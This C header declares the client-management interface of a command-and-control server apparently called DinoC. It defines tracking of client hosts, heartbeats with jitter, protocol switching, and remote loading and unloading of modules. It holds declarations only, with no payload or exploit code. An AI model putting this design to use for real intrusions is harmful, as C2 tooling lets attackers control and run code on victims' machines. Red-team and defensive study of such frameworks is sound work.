/**
 * @file client.h
 * @brief Client management interface for C2 server
 */

#ifndef DINOC_CLIENT_H
#define DINOC_CLIENT_H

#include "common.h"
#include "protocol.h"
#include <stdint.h>
#include <stdbool.h>
#include <time.h>
#include <uuid/uuid.h>

// Forward declarations
typedef struct protocol_listener protocol_listener_t;

/**
 * @brief Client state enumeration
 */
typedef enum {
    CLIENT_STATE_NEW = 0,          // Client is new
    CLIENT_STATE_CONNECTED = 1,    // Client is connected
    CLIENT_STATE_REGISTERED = 2,   // Client is registered
    CLIENT_STATE_ACTIVE = 3,       // Client is active
    CLIENT_STATE_INACTIVE = 4,     // Client is inactive
    CLIENT_STATE_DISCONNECTED = 5  // Client is disconnected
} client_state_t;

/**
 * @brief Client structure
 */
struct client {
    uuid_t id;                     // Client ID
    client_state_t state;          // Client state
    protocol_listener_t* listener; // Protocol listener
    protocol_type_t protocol_type; // Protocol type
    void* protocol_context;        // Protocol-specific context
    char* hostname;                // Client hostname
    char* ip_address;              // Client IP address
    char* os_info;                 // Client OS information
    time_t first_seen_time;        // Time when client was first seen
    time_t last_seen_time;         // Time when client was last seen
    time_t last_heartbeat;         // Time of last heartbeat
    uint32_t heartbeat_interval;   // Heartbeat interval in seconds
    uint32_t heartbeat_jitter;     // Heartbeat jitter in seconds
    void* modules;                 // Loaded modules
    size_t modules_count;          // Number of loaded modules
};

/**
 * @brief Initialize client manager
 * 
 * @return status_t Status code
 */
status_t client_manager_init(void);

/**
 * @brief Shutdown client manager
 * 
 * @return status_t Status code
 */
status_t client_manager_shutdown(void);

/**
 * @brief Register a new client
 * 
 * @param listener Protocol listener
 * @param protocol_context Protocol-specific context
 * @param client Pointer to store created client
 * @return status_t Status code
 */
status_t client_register(protocol_listener_t* listener, void* protocol_context, client_t** client);

/**
 * @brief Update client state
 * 
 * @param client Client to update
 * @param state New state
 * @return status_t Status code
 */
status_t client_update_state(client_t* client, client_state_t state);

/**
 * @brief Update client information
 * 
 * @param client Client to update
 * @param hostname Client hostname
 * @param ip_address Client IP address
 * @param os_info Client OS information
 * @return status_t Status code
 */
status_t client_update_info(client_t* client, const char* hostname, const char* ip_address, const char* os_info);

/**
 * @brief Set client heartbeat parameters
 * 
 * @param client Client to update
 * @param interval Heartbeat interval in seconds
 * @param jitter Heartbeat jitter in seconds
 * @return status_t Status code
 */
status_t client_set_heartbeat(client_t* client, uint32_t interval, uint32_t jitter);

/**
 * @brief Process client heartbeat
 * 
 * @param client Client to update
 * @return status_t Status code
 */
status_t client_heartbeat(client_t* client);

/**
 * @brief Send heartbeat request to client
 * 
 * @param client Client to send heartbeat request to
 * @return status_t Status code
 */
status_t client_send_heartbeat_request(client_t* client);

/**
 * @brief Check if client heartbeat has timed out
 * 
 * @param client Client to check
 * @return bool True if client heartbeat has timed out
 */
bool client_is_heartbeat_timeout(const client_t* client);

/**
 * @brief Switch client protocol
 * 
 * @param client Client to update
 * @param protocol_type New protocol type
 * @return status_t Status code
 */
status_t client_switch_protocol(client_t* client, protocol_type_t protocol_type);

/**
 * @brief Load module on client
 * 
 * @param client Client to update
 * @param module_name Module name
 * @param module_data Module data
 * @param module_data_len Module data length
 * @return status_t Status code
 */
status_t client_load_module(client_t* client, const char* module_name, const uint8_t* module_data, size_t module_data_len);

/**
 * @brief Unload module from client
 * 
 * @param client Client to update
 * @param module_name Module name
 * @return status_t Status code
 */
status_t client_unload_module(client_t* client, const char* module_name);

/**
 * @brief Find a client by ID
 * 
 * @param id Client ID
 * @return client_t* Found client or NULL if not found
 */
client_t* client_find(const uuid_t* id);

/**
 * @brief Get all clients
 * 
 * @param clients Pointer to store clients array
 * @param count Pointer to store number of clients
 * @return status_t Status code
 */
status_t client_get_all(client_t*** clients, size_t* count);

/**
 * @brief Destroy a client
 * 
 * @param client Client to destroy
 * @return status_t Status code
 */
status_t client_destroy(client_t* client);

#endif /* DINOC_CLIENT_H */
